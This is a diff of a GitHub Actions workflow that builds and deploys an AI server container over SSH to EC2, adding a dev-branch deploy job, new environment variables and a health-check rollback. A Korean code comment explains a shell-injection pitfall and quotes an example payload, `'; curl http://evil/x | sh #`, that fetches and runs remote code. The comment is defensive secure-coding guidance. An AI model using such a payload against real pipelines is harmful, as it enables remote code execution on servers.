@@ -2,7 +2,7 @@ name: Jarvis AI Server CI/CD
 
 on:
   push:
-    branches: [main]
+    branches: [main, dev]
   workflow_dispatch:   # Actions 탭에서 수동 실행 가능
 
 env:
@@ -35,9 +35,10 @@ jobs:
           cache-from: type=gha
           cache-to: type=gha,mode=max   # 레이어 캐시로 빌드 가속
 
-  # 2단계: 자동 배포 (CD)
+  # 2단계: 자동 배포 (CD) — main 브랜치 전용
   #   AI 서버는 1대뿐이라 대체할 인스턴스가 없음 — 실패 시 자동 복구가 필수
   deploy:
+    if: github.ref == 'refs/heads/main'
     needs: build
     runs-on: ubuntu-latest
     permissions:
@@ -77,6 +78,8 @@ jobs:
             cat << 'ENVEOF' > "$ENV_FILE"
             AUTH_MODE=${{ vars.AUTH_MODE }}
             LLM_PROVIDER=${{ vars.LLM_PROVIDER }}
+            SCRIPTED_LLM_MODE=${{ vars.SCRIPTED_LLM_MODE }}
+            SCRIPTED_LLM_DELAY_S=${{ vars.SCRIPTED_LLM_DELAY_S }}
             CATALOG_DB_URL=${{ secrets.CATALOG_DB_URL }}
             PROFILE_DB_URL=${{ secrets.PROFILE_DB_URL }}
             SPRING_BASE_URL=${{ secrets.SPRING_BASE_URL }}
@@ -128,9 +131,11 @@ jobs:
             MODEL_PRICE_OUT_PER_1K=${{ vars.MODEL_PRICE_OUT_PER_1K }}
             SPRING_MAX_RETRIES=${{ vars.SPRING_MAX_RETRIES }}
             RESCUE_BUDGET_MODE=${{ vars.RESCUE_BUDGET_MODE }}
+            RATE_LIMIT_PER_MIN=${{ vars.RATE_LIMIT_PER_MIN }}
+            RATE_LIMIT_PER_HOUR=${{ vars.RATE_LIMIT_PER_HOUR }}
             ENVEOF
 
-            # 3b. [#437/#532, PR #539 리뷰] 위 네 키의 (A) 조건부 규약(미등록 Variable = 줄 없음 =
+            # 3b. [#437/#532, PR #539 리뷰] 아래 조건부 키의 (A) 규약(미등록 Variable = 줄 없음 =
             #     코드 기본값)은 heredoc **안**에서 값을 쓰고 빈 줄만 사후에 지우는 방식으로만
             #     구현한다 — **Actions 표현식(달러+이중중괄호, 예: vars.X)을 실행되는 셸 문장
             #     (예: `V='<그 표현식>'`)에 직접 스플라이스하면 안 된다.**
@@ -142,16 +147,16 @@ jobs:
             #     리터럴이 거기서 끝나고 이어지는 텍스트가 운영 EC2 에서 그대로 실행된다(예:
             #     값이 `'; curl http://evil/x | sh #` 면 원격 코드 실행 — 최초 구현이 이 함정에
             #     빠져 리뷰로 지적됐다). 위 quoted heredoc(`cat << 'ENVEOF'`) 본문은 셸이 전혀
-            #     재해석하지 않는 **데이터**라 이 경로가 구조적으로 없다 — 그래서 네 키도 기존
+            #     재해석하지 않는 **데이터**라 이 경로가 구조적으로 없다 — 그래서 조건부 키도 기존
             #     19+줄과 똑같이 heredoc 안에 쓰고, 빈/공백뿐인 값만 아래에서 줄째 삭제해 (A)
-            #     규약을 지킨다. sed 대상은 이 네 키로 **한정**한다(기존 줄은 손대지 않는다).
+            #     규약을 지킨다. sed 대상은 명시한 키로 **한정**한다(기존 줄은 손대지 않는다).
             #     `set -e` 아래라 sed 실패는 배포를 그대로 중단시킨다(의도된 동작). `sed -i` 는
             #     같은 디렉터리에 임시 파일을 만들고 원본으로 rename 하는데, GNU sed 는 그
             #     임시 파일에 원본 $ENV_FILE 의 권한을 그대로 복사한다(umask 와 무관 — 로컬
             #     실측 확인: umask 077 로 만든 0600 파일을 이후 umask 022 로 sed -i 해도 0600
             #     유지). 위 `umask 077` 은 최초 heredoc 생성 시점에 $ENV_FILE 자체를 0600 으로
             #     만드는 역할이고, sed 는 그 권한을 깨지 않고 물려받을 뿐이다.
-            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE)=[[:space:]]*$/d' "$ENV_FILE"
+            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE|SCRIPTED_LLM_MODE|SCRIPTED_LLM_DELAY_S|RATE_LIMIT_PER_MIN|RATE_LIMIT_PER_HOUR)=[[:space:]]*$/d' "$ENV_FILE"
 
             # 4. 교체 — 8000 포트를 새 컨테이너가 이어받아야 하므로 중지 후 기동
             #    docker run 뒤의 || true 는 필수: 기동 명령 자체가 실패해도
@@ -224,4 +229,125 @@ jobs:
             docker inspect -f '{{.Config.Image}}' jarvis-ai > "$LAST_GOOD"
 
             # 8. 48시간 이상 지난 미사용 이미지 정리 (sha 태그 누적 방지)
+            docker image prune -af --filter "until=48h"
+
+  # 3단계: dev 서버 배포 — dev 브랜치 전용
+  #   DB는 catalog_dev·profile_dev로 분리, 백엔드 호출은 dev 도메인으로 향한다.
+  deploy-dev:
+    if: github.ref == 'refs/heads/dev'
+    needs: build
+    runs-on: ubuntu-latest
+    permissions:
+      packages: read
+    steps:
+      - name: dev AI 서버 배포 및 기동 검증
+        uses: appleboy/ssh-action@v1.0.3
+        with:
+          host: ${{ secrets.EC2_AI_HOST_DEV }}
+          username: ${{ secrets.EC2_USERNAME }}
+          key: ${{ secrets.EC2_SSH_KEY }}
+          timeout: 15m
+          command_timeout: 15m
+          script: |
+            set -e
+
+            ENV_FILE=/home/ubuntu/jarvis-ai.env
+            ENV_PREV=/home/ubuntu/jarvis-ai.env.prev
+            LAST_GOOD=/home/ubuntu/jarvis-ai.last-good
+
+            PREV_IMAGE=$(docker inspect -f '{{.Config.Image}}' jarvis-ai 2>/dev/null || true)
+
+            echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+            docker pull ${{ env.IMAGE }}:${{ github.sha }}
+
+            umask 077
+            if [ -f "$ENV_FILE" ]; then
+              cp "$ENV_FILE" "$ENV_PREV"
+            fi
+            cat << 'ENVEOF' > "$ENV_FILE"
+            AUTH_MODE=${{ vars.AUTH_MODE }}
+            LLM_PROVIDER=${{ vars.LLM_PROVIDER }}
+            CATALOG_DB_URL=${{ secrets.CATALOG_DB_URL_DEV }}
+            PROFILE_DB_URL=${{ secrets.PROFILE_DB_URL_DEV }}
+            SPRING_BASE_URL=https://dev.narvis.shop
+            JWKS_URL=https://dev.narvis.shop/.well-known/jwks.json
+            JWT_ISSUER=${{ vars.JWT_ISSUER }}
+            JWT_AUDIENCE=${{ vars.JWT_AUDIENCE }}
+            JWT_SCOPE=${{ vars.JWT_SCOPE }}
+            INTERNAL_API_TOKEN=${{ secrets.INTERNAL_API_TOKEN }}
+            OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}
+            OPENAI_FAST_MODEL_ID=${{ vars.OPENAI_FAST_MODEL_ID }}
+            OPENAI_SMART_MODEL_ID=${{ vars.OPENAI_SMART_MODEL_ID }}
+            OPENAI_FAST_REASONING_EFFORT=${{ vars.OPENAI_FAST_REASONING_EFFORT }}
+            OPENAI_SMART_REASONING_EFFORT=${{ vars.OPENAI_SMART_REASONING_EFFORT }}
+            APP_ENVIRONMENT=${{ vars.APP_ENVIRONMENT }}
+            COLOR_SYNONYM_EXPANSION_ENABLED=${{ vars.COLOR_SYNONYM_EXPANSION_ENABLED }}
+            COLOR_SYNONYM_ARRAY_CONTRACT_READY=${{ vars.COLOR_SYNONYM_ARRAY_CONTRACT_READY }}
+            TRUST_FORWARDED_FOR=${{ vars.TRUST_FORWARDED_FOR }}
+            FORWARDED_FOR_TRUSTED_HOPS=${{ vars.FORWARDED_FOR_TRUSTED_HOPS }}
+            LANGSMITH_TRACING=${{ vars.LANGSMITH_TRACING }}
+            LANGSMITH_API_KEY=${{ secrets.LANGSMITH_API_KEY }}
+            LANGSMITH_PROJECT=${{ vars.LANGSMITH_PROJECT }}
+            LANGSMITH_TRACING_SAMPLING_RATE=${{ vars.LANGSMITH_TRACING_SAMPLING_RATE }}
+            LANGSMITH_EXPORT_TIMEOUT_S=${{ vars.LANGSMITH_EXPORT_TIMEOUT_S }}
+            LANGSMITH_TRACE_CONTENT=${{ vars.LANGSMITH_TRACE_CONTENT }}
+            GOOGLE_API_KEY=${{ secrets.GOOGLE_API_KEY }}
+            PII_HASH_PEPPER=${{ secrets.PII_HASH_PEPPER }}
+            EMBEDDING_MODEL_ID=${{ vars.EMBEDDING_MODEL_ID }}
+            EMBEDDING_DIM=${{ vars.EMBEDDING_DIM }}
+            CORS_ORIGINS=["http://localhost:3000", "https://dev.narvis.shop"]
+            MODEL_PRICE_IN_PER_1K=${{ vars.MODEL_PRICE_IN_PER_1K }}
+            MODEL_PRICE_OUT_PER_1K=${{ vars.MODEL_PRICE_OUT_PER_1K }}
+            SPRING_MAX_RETRIES=${{ vars.SPRING_MAX_RETRIES }}
+            RESCUE_BUDGET_MODE=${{ vars.RESCUE_BUDGET_MODE }}
+            ENVEOF
+
+            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE)=[[:space:]]*$/d' "$ENV_FILE"
+
+            docker stop jarvis-ai || true
+            docker rm -f jarvis-ai || true
+            docker run -d \
+              --name jarvis-ai \
+              --restart always \
+              -p 8000:8000 \
+              --log-opt max-size=10m \
+              --log-opt max-file=3 \
+              --env-file "$ENV_FILE" \
+              ${{ env.IMAGE }}:${{ github.sha }} || true
+
+            OK=0
+            for i in $(seq 1 45); do
+              if curl -fs http://localhost:8000/health > /dev/null; then OK=1; break; fi
+              sleep 2
+            done
+
+            if [ "$OK" != "1" ]; then
+              docker logs --tail 100 jarvis-ai || true
+              docker rm -f jarvis-ai || true
+
+              ROLLBACK_IMAGE="$PREV_IMAGE"
+              if [ -z "$ROLLBACK_IMAGE" ] && [ -f "$LAST_GOOD" ]; then
+                ROLLBACK_IMAGE=$(cat "$LAST_GOOD")
+              fi
+              if [ -z "$ROLLBACK_IMAGE" ]; then
+                docker images ${{ env.IMAGE }} --format '{{.Tag}} {{.CreatedSince}}' | head -10
+                exit 1
+              fi
+
+              if [ -f "$ENV_PREV" ]; then
+                cp "$ENV_PREV" "$ENV_FILE"
+              fi
+
+              docker run -d \
+                --name jarvis-ai \
+                --restart always \
+                -p 8000:8000 \
+                --log-opt max-size=10m \
+                --log-opt max-file=3 \
+                --env-file "$ENV_FILE" \
+                "$ROLLBACK_IMAGE" || true
+              exit 1
+            fi
+
+            docker inspect -f '{{.Config.Image}}' jarvis-ai > "$LAST_GOOD"
             docker image prune -af --filter "until=48h"
